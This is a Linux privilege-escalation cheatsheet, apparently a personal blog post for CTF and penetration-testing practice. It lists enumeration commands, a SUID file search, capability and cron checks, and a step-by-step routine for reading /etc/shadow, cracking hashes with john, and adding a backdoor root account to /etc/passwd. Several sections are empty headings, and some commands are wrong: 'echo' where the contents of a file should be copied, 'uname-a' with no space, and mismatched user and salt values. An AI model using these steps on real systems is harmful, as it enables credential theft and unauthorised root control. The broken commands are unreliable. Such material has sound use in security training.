---
title: Linux Privilege Escalation
date: 2022-08-15
categories: [Cheatsheet]
tags: [linux, privesc]
---

# What is Privilege Escalation ?

# Enumeration
````bash
hostname
````
This command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. _Ubuntu-3487340239_), in some cases, it can provide information about the target system’s role within the corporate network (e.g. _SQL-PROD-01_ for a production SQL server).
 
````bash
uname -a
````
This command will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities.

````bash
cat /proc/version
````
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.
Looking at `/proc/version`{: .filepath} may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

````bash
cat /etc/issue
````
Systems can also be identified by looking at the `/etc/issue`{: .filepath} file. This file usually contains some information about the operating system but can easily be customized or changes. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

````bash
ps
````
The ps (Process Status) command is an effective way to see the running processes on a Linux system.

The output of the ps will show the following;
• __PID__: The process ID (unique to the process)
• __TTY__: Terminal type used by the user
• __Time__: Amount of CPU time used by the process (this is NOT the time this process has been running for)
• __CMD__: The command or executable running (will NOT display any command line parameter)

Use ``ps -A`` to view all the running processes.

````bash
env
````

````bash
sudo -l
````
List the command which can be runned as root with the current user

````bash
id
````

````bash
cat /etc/passwd
````

````bash
cat /etc/shadow
````

````bash
history
````

````bash
ifconfig
````

````bash
netstat
````

````bash
find
````

````bash
ip route
````

````bash
netstat
````

# Kernel exploits
## Methodology
The Kernel exploit methodology is simple
1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

The following commands will help you gather enough information:
````bash
uname-a
cat /proc/version
cat /etc/issue
````

## Hints/Notes:
1. Don't hesitade being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
4. You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.

# SUDO

# SUID / GUID
## What is SUID / GUID ?
Use this command to find all the file of the system with SUID permission
````bash
find / -type f -perm -04000 -ls 2>/dev/null
````
Then compare your findings with GTFOBins: <https://gtfobins.com>

# /etc
If we can read the `/etc/passwd`{: .filepath} and the `/etc/shadow`{: .filepath} files :

1. Copy the content of each file
````bash
echo /etc/passwd > passwd.txt
echo /etc/shadow > shadow.txt
````
2. Use _unshadow_ to create a usable file for _john_
````bash
unshadow passwd.txt shadow.txt > unshadowed.txt
````
3. Then let _john_ do the job
````bash
john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt
````
4. You can now add new user with root privileges
````bash
openssl passwd -1 -salt new_user new_password
-> hash
````
5. in /etc/passwd at the end add 
````bash
user:hash:0:0:root:/root:/bin/bash
````
6. You should now login into your new root user
````bash
su new_user
````

# Capabilities
Another method system administrators can use to increase the privilege level of a process or binary is "Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

Use the following command to identify potential capabilities :
````bash
getcap -r / 2>/dev/null
````

# Cron Jobs
To list all jobs :
````bash
cat /etc/crontab
````
try to see if :
- a file runned by a cron job can be modified and therefore run cmd with root privileges
- a cron job try to run a file that doesn't exists anymore

# $PATH

# NFS

